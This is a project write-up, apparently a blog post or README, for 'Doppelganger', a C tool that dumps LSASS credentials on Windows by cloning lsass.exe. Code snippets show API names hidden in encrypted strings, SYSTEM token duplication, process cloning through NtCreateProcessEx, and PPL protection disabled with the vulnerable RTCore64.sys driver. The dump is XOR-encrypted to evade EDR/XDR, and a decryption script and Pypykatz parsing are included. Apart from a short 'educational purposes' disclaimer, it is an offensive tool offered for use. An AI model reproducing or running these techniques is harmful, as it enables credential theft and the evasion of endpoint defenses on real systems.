---
title: "Doppelganger"
date: 2025-04-02T15:28:21+02:00
draft: false
---

# Doppelganger Program: An Advanced LSASS Dumper with Process Cloning

## Author: vari.sh

---

![Doppelganger](/images/doppelganger.png)

## Overview

**Doppelganger** is an advanced Windows utility designed to obtain an LSASS (Local Security Authority Subsystem Service) dump from a cloned process rather than the original one. By using process cloning techniques, the tool aims to bypass PPL (Protected Process Light), VBS (Virtualization-Based Security), and EDR/XDR detection mechanisms that typically monitor interactions with `lsass.exe`.

The program achieves this by:

- Obtaining a SYSTEM token through token duplication and privilege escalation.
- Loading clean versions of Windows DLLs and dynamically resolving APIs with obfuscation techniques to avoid detection.
- Cloning the LSASS process using `NtCreateProcessEx`.
- Disabling PPL (Protected Process Light) protection on `lsass.exe` using direct memory access.
- Creating an LSASS clone dump using `MiniDumpWriteDump()`.
- Encrypting the dump file using XOR encryption to further avoid detection.

---

## Features

- **Token Manipulation:** Elevates to SYSTEM privileges to access LSASS, ensuring compatibility even with domain accounts.
- **Driver Interaction:** Leverages `RTCore64.sys` for direct memory access to disable PPL, utilizing kernel privileges to modify process protection.
- **Process Cloning:** Uses `NtCreateProcessEx` to clone `lsass.exe` and evade detection by EDR/XDR solutions.
- **XOR Encryption:** Dumps are encrypted with a predefined XOR key before being written to a file. The dump is temporarily written to a temp file to avoid detection, then XORed and saved to disk.
- **DLL Obfuscation:** Loads DLLs and APIs using encrypted strings to bypass signature-based detections, preventing static analysis.

---

## Installation

The Doppelganger Program is written in C and is intended to be compiled using Visual Studio or compatible IDEs. The repository is structured as follows:

```
Doppelganger/
│
├── Doppelganger/         
│    ├── include/      # Header files (.h)
│    └── src/          # Source files (.c)
├── utils/             # Utility scripts (e.g., decryptor, driver)
└── README.md          # Documentation
```

### Compilation

Compile the project in Visual Studio using the provided solution file.  
Ensure the `RTCore64.sys` driver is present and accessible by the program (in `C:\Users\Public\` on the target machine).

---

## Code Breakdown

### 1. Resolving APIs

The tool resolves critical Windows APIs by decrypting their names from encrypted strings and dynamically loading them with custom API resolution methods. This allows bypassing API monitoring mechanisms from security solutions.

```c
// Example of resolving API pointers

// "NtCreateProcessEx"
static const unsigned char NTCPE_ENC[] = {
    0x7E, 0x45, 0x71, 0x41, 0x51, 0x54, 0x42, 0x52, 0x68, 0x4B, 0x0E, 0x01, 0x06, 0x17, 0x16, 0x23, 0x1F
};

typedef NTSTATUS(NTAPI* PFN_NTCPX)(
    PHANDLE ProcessHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ParentProcess,
    ULONG Flags,
    HANDLE SectionHandle OPTIONAL,
    HANDLE DebugPort OPTIONAL,
    HANDLE ExceptionPort OPTIONAL,
    BOOLEAN InJob
);

#define DECL_API_PTR(name) PFN_##name p##name = NULL

DECL_API_PTR(NTCPX);

BOOL success = ResolveApiFromDll(hNtdll, NTCPE_ENC, sizeof(NTCPE_ENC), (void**)&pNTCPX);

if (!success) {
    log_error("Failed to resolve one or more APIs.");
    return FALSE;
}
```

### 2. Token Duplication

To interact with `lsass.exe`, the tool impersonates SYSTEM using duplicated tokens.

```c
HANDLE hSystemToken = NULL;
if (!GetSystemTokenAndDuplicate(&hSystemToken)) {
    log_error("Failed to duplicate SYSTEM token.");
    return 1;
}
```

### 3. Process Cloning

Using `NtCreateProcessEx`, the tool creates a clone of `lsass.exe`.

```c
NTSTATUS status = pNTCPX(
    &hClone,
    PROCESS_ALL_ACCESS,
    &objAttr,
    hLsass,
    0,
    NULL,
    NULL,
    NULL,
    FALSE
);
```

### 4. Disabling PPL

Protected Process Light (PPL) protection is disabled by directly modifying memory using the `RTCore64.sys` driver.

```c
WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 2, 0x00); // SignatureLevel
WriteMemoryPrimitive(Device, 1, eproc + offs.Protection - 1, 0x00); // SectionSignatureLevel
WriteMemoryPrimitive(Device, 1, eproc + offs.Protection, 0x00); // Protection
log_success("PPL disabled (0x00 written)");
```

### 5. Creating the Dump

A memory dump of the cloned `lsass.exe` process is created in a temp file, then encrypted and written to `C:\Users\Public\`.

```c
BOOL dumped = pMDWD(
    hClone,
    clonedPID,
    hTempFile,
    MiniDumpWithFullMemory,
    NULL,
    NULL,
    NULL
);
```

### 5. Restoring PPL

Protection fields are then restored to their original values.

```c
WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 2, OriginalSigLv);
WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection - 1, OriginalSecSigLv);
WriteMemoryPrimitive(Device, 1, SavedEproc + offs.Protection, OriginalProt);
log_success("PPL restored to original value:");
```

---

## Decryption

A simple Python script is provided in the `utils` folder to decrypt the dumped files.

### Decryption Script

```python
import sys

XOR_KEY = b"0123456789abcdefghij"

def xor_decrypt(data: bytes, key: bytes) -> bytes:
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <xor_dump_path>")
        sys.exit(1)

    encrypted_path = sys.argv[1]
    output_path = encrypted_path + ".dec"

    try:
        with open(encrypted_path, "rb") as f:
            data = f.read()
    except IOError as e:
        print(f"[!] Failed to read file: {e}")
        sys.exit(1)

    decrypted = xor_decrypt(data, XOR_KEY)

    try:
        with open(output_path, "wb") as f:
            f.write(decrypted)
    except IOError as e:
        print(f"[!] Failed to write decrypted file: {e}")
        sys.exit(1)

    print(f"[+] Decryption successful. Output written to: {output_path}")

if __name__ == "__main__":
    main()
```

---

## Analysis

You can use Pypykatz to read the dump. Pypykatz may complain about the PEB structure since it's not the original `lsass.exe` PEB, but the rest of the parsing will work perfectly.

---

## Conclusion

The Doppelganger Program demonstrates how process cloning, API obfuscation, and memory manipulation can be used to bypass traditional detection mechanisms. The combination of techniques makes it effective and may retrieve sensitive memory data even on systems protected by advanced EDR/XDR solutions.

---

## Disclaimer

This project is for educational purposes only. Use it responsibly and only in environments where you have explicit permission to test security mechanisms.

